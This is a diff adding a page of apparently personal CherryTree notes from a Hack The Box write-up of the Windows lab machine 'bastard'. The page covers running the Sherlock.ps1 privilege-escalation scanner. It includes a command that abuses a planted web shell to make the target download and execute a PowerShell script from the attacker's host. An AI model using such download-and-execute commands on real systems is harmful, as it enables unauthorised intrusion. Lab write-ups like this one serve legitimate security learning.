@@ -1,0 +1,33 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Sherlock.ps1</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><a href="../HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
+<p><a href="HacktheBox--Windows_Boxes--bastard.html">bastard</a></p>
+
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--nmap.html">nmap </a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--http--gobuster.html">gobuster</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--initial_foothold--cookie_manager.html">cookie manager</a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--initial_foothold--drupal.php_RCE_exploit.html">drupal.php RCE exploit</a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--initial_foothold--nc64.html">nc64</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--privesc.html">privesc</a></li>
+<ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--privesc--Sherlock.ps1.html">Sherlock.ps1</a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--privesc--MS15-051.html">MS15-051</a></li>
+</ol>
+<li><a href="HacktheBox--Windows_Boxes--bastard--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Windows_Boxes--bastard--lessons_learned.html">lessons learned</a></li>
+</ol></div>
+<div class="page"><h1><b><u>Sherlock.ps1</u></b></h1><span style="color:#24ff00;">Shecklock is a great privilege escalatation tool we can showcase on this writeup as well,</span><br /><img src="images/54-1.png" alt="images/54-1.png" /><br /><br /><span style="color:#ffff00;">don't forget to add </span><img src="images/54-2.png" alt="images/54-2.png" /> at the end of our Sherlock.ps1 script!<br /><br /><span style="color:#24ff00;">to download and run it, run the following </span><br /><span style="color:#ffa500;">http://10.10.10.9/steve.php?fexec=echo IEX(New-Object Net.Webclient).downloadString('http://10.10.14.62:8000/Sherlock.ps1') | powershell -noprofile -</span><br /><img src="images/54-3.png" alt="images/54-3.png" /><br /><img src="images/54-4.png" alt="images/54-4.png" /><br /><img src="images/54-5.png" alt="images/54-5.png" /><br /><span style="color:#ffa500;">Sherlock</span><span style="color:#24ff00;"> scans for and outputs a bunch of vulnerabilities we can utilize to escalate our privileges</span><br /><br /><br /></div></div>
+</body></html>
